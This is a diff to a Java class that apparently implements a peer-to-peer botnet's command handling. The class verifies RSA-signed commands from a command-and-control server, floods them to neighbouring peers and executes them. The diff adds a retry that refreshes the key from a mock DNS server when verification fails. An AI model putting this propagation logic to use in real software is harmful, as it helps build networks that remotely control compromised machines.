@@ -171,8 +171,8 @@ public class Behavior {
 					// System.out.println("signature" + msgs[2]);
 					// System.out.println(" pk " +
 					// pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
-					if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
-							nServ.getCommandConquerIps().get(0).getValue2())) {
+				
+					if (pki.validateSignedMessageRSA(msgs[0], msgs[2],	nServ.getCommandConquerIps().get(0).getValue2())) {
 						Pairs<Integer, String> data = new Pairs<>();
 						data.setValue1(msgHashList.getSize() + 1);
 						data.setValue2(msgs[0]);
@@ -185,7 +185,26 @@ public class Behavior {
 						executeCommand(msgs[1]);
 
 					} else {
-						System.out.println("Signature Comando FALLITA");
+						System.out.println("Signature Comando FALLITA1");
+						nServ.firstConnectToMockServerDns();
+						if (pki.validateSignedMessageRSA(msgs[0], msgs[2],	nServ.getCommandConquerIps().get(0).getValue2())) {
+							Pairs<Integer, String> data = new Pairs<>();
+							data.setValue1(msgHashList.getSize() + 1);
+							data.setValue2(msgs[0]);
+							msgHashList.add(data);
+							System.out.println("Signature OK");
+							// se verificato inoltralo ai vicini
+							System.out.println("Flood a vicini");
+							floodNeighoours(rawData, ip);
+							// inoltra all'interpretedei msg
+							executeCommand(msgs[1]);
+
+						} else {
+							System.out.println("Signature Comando FALLITA2");
+							nServ.firstConnectToMockServerDns();
+							
+						}
+						
 					}
 				} catch (InvalidKeyException | SignatureException e) {
 					System.out.println("Errore verifica Signature durante il flooding " + msgs[2]);
